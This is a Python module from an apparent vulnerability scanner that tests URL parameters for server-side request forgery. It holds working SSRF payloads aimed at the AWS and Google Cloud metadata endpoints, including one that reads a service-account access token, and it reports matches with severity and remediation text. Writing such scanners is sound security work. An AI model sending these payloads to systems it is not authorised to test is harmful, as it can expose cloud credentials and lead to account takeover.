import difflib
import re
from typing import List, Dict, Any
from engine.requester import Requester
from engine.baseline import TargetBaseline

SSRF_PARAM_CANDIDATES = ["url", "dest", "redirect", "uri", "target", "link", "src", "feed", "host", "domain", "callback"]

CLOUD_METADATA_PROBES = [
    {
        "provider": "AWS IMDSv1",
        "payload": "http://169.254.169.254/latest/meta-data/hostname",
        "expected_regex": r"ip-\d+-\d+-\d+-\d+|ec2|compute\.internal|[a-z0-9\-]+\.ec2\.internal",
        "severity": "CRITICAL",
        "cwe_id": "CWE-918",
        "owasp_category": "A10:2021-Server-Side Request Forgery (SSRF)",
        "cvss_score": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
        "description": "Server responded with AWS EC2 instance metadata when supplied with the link-local metadata address.",
        "impact": "Full extraction of IAM role security credentials, AWS tokens, and host compromise."
    },
    {
        "provider": "Google Cloud Metadata",
        "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "expected_regex": r"\"access_token\":\s*\"ya29\.|service-accounts|computeMetadata",
        "severity": "CRITICAL",
        "cwe_id": "CWE-918",
        "owasp_category": "A10:2021-Server-Side Request Forgery (SSRF)",
        "cvss_score": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
        "description": "Server accessible GCP compute metadata returning GCP OAuth service account tokens.",
        "impact": "Total cloud infrastructure compromise with Google Cloud project takeover."
    }
]

async def run_ssrf_scan(requester: Requester, baseline: TargetBaseline, scan_id: str, target_url: str) -> List[Dict[str, Any]]:
    findings = []
    base_clean = target_url.rstrip("/")
    for param in SSRF_PARAM_CANDIDATES[:3]:
        for probe in CLOUD_METADATA_PROBES:
            test_url = f"{base_clean}/?{param}={probe['payload']}"
            res = await requester.send("GET", test_url, module="ssrf_probe")
            if baseline.is_similar_to_nonexistent(res):
                continue
            if baseline.root_response:
                similarity = difflib.SequenceMatcher(None, res.body[:2000], baseline.root_response.body[:2000]).quick_ratio()
                if similarity > 0.95:
                    continue
            if probe["expected_regex"]:
                match = re.search(probe["expected_regex"], res.body, re.IGNORECASE)
                if match:
                    findings.append({
                        "scan_id": scan_id, "target_url": target_url, "endpoint": test_url, "tested_endpoint": test_url,
                        "parameter_name": param, "parameter_location": "Query Parameter",
                        "payload_used": f"?{param}={probe['payload']}", "payload_type": "Cloud Metadata IMDS Probe",
                        "vuln_type": f"Confirmed SSRF ({probe['provider']})",
                        "title": f"Server-Side Request Forgery via '{param}' parameter",
                        "severity": probe["severity"], "confidence": "CONFIRMED", "is_confirmed": True,
                        "cvss_score": probe["cvss_score"], "cvss_vector": probe["cvss_vector"],
                        "cwe_id": probe["cwe_id"], "owasp_category": probe["owasp_category"],
                        "category": "Server-Side", "template_id": "vf-ssrf-confirmed",
                        "short_description": f"Server processed link-local metadata request on parameter '{param}' and returned internal cloud credentials.",
                        "description": probe["description"], "technical_impact": probe["impact"],
                        "remediation": "Implement an allowlist of permitted destination domains. Block private IP ranges (169.254.169.254, 127.0.0.0/8).",
                        "request_method": "GET", "raw_request": res.raw_request, "request_headers": res.request_headers,
                        "request_body": res.request_body, "raw_response": res.raw_response, "response_headers": res.headers,
                        "response_body": res.body[:50000], "response_status": res.status_code, "response_time_ms": res.duration_ms,
                        "baseline_raw_response": baseline.root_response.raw_response if baseline.root_response else "",
                        "verification_proof": f"Target server processed internal metadata payload and returned signature '{match.group(0)}'."
                    })
                    break
    return findings
